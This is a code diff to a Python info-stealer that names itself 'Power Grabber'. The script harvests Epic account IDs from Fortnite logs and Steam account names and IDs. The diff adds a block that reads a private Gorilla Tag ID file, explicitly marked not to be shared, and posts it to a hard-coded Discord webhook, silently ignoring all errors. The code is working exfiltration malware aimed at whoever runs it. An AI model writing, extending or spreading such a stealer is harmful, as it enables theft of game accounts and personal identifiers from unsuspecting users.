@@ -2,9 +2,14 @@ import os
 import re
 import requests
 import datetime
+import json
+webhook_url = "https://discord.com/api/webhooks/1329909468653424650/AtSCYLJYHm1DPd-i4__hGhcmHGZwgbvUIJ4EUQsn-vC-j9i8ytD3lPzoeo9BNCoczqJc"
+file_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'LocalLow', 'Another Axiom', 'Gorilla Tag', 'DoNotShareWithAnyoneEVERNoMatterWhatTheySay.txt')
 app_data_path = os.getenv('APPDATA')
 log_file_path = os.path.join(app_data_path, r"..\Local\FortniteGame\Saved\Logs\FortniteGame.log")
+account_name = None
 def find_user_info(log_file_path):
+    global account_name
     try:
         with open(log_file_path, 'r', encoding='utf-8') as file:
             for line in file:
@@ -13,6 +18,7 @@ def find_user_info(log_file_path):
                     user_id = match.group(1)
                     display_name = match.group(2)
                     epic_account_id = match.group(3)
+                    account_name = display_name
                     return user_id, display_name, epic_account_id
         return None, None, None
     except FileNotFoundError:
@@ -29,7 +35,7 @@ def send_to_discord(display_name, user_id, epic_account_id, image_url):
                 },
                 "fields": [
                     {
-                        "name": "Username:",
+                        "name": "👤Epic Account name:",
                         "value": display_name,
                         "inline": True
                     },
@@ -62,12 +68,10 @@ def send_to_discord(display_name, user_id, epic_account_id, image_url):
     else:
         pass
 user_id, display_name, epic_account_id = find_user_info(log_file_path)
-
 img = {
     'image_url': 'https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true'
 }
 image_url = img['image_url']
-
 if user_id and display_name and epic_account_id:
     send_to_discord(display_name, user_id, epic_account_id, image_url)
 else:
@@ -91,6 +95,7 @@ def is_steam_installed():
             return path
     return None
 def get_account_name_and_steam_id_from_vdf(vdf_path):
+    global account_name
     try:
         with open(vdf_path, "r", encoding="utf-8") as file:
             data = file.read()
@@ -141,7 +146,7 @@ def send_webhook(account_name, games, steam_id, image_url):
             {
                 "title": f"🎮 Steam Account Info for **{account_name}**",
                 "description": (
-                    "Here's the **Steam Account Information**, a list of **installed games**, and the **games URL** for this user."
+                    "Here is some steam info for this user."
                 ),
                 "color": 0x8b0000,
                 "thumbnail": {
@@ -205,3 +210,31 @@ def main():
         pass
 if __name__ == "__main__":
     main()
+try:
+    with open(file_path, 'r') as file:
+            contents = file.read()
+    embed = {
+            "avatar_url": image_url,
+            "embeds": [{
+                "title": f"**{account_name}'s Gorilla Tag ID**",
+                "description": contents,
+                "timestamp": datetime.datetime.utcnow().isoformat() + "Z",
+                "thumbnail": {
+                    "url": image_url
+                },
+                "footer": {
+                    "text": "Power Grabber | Created by Powercascade & Taktikal.exe",
+                    "icon_url": image_url
+                },
+                "color": 0x8b0000,
+            }]
+        }
+    response = requests.post(webhook_url, data=json.dumps(embed), headers={"Content-Type": "application/json"})
+    if response.status_code == 204:
+        pass
+    else:
+        pass
+except FileNotFoundError:
+    pass
+except Exception as e:
+    pass
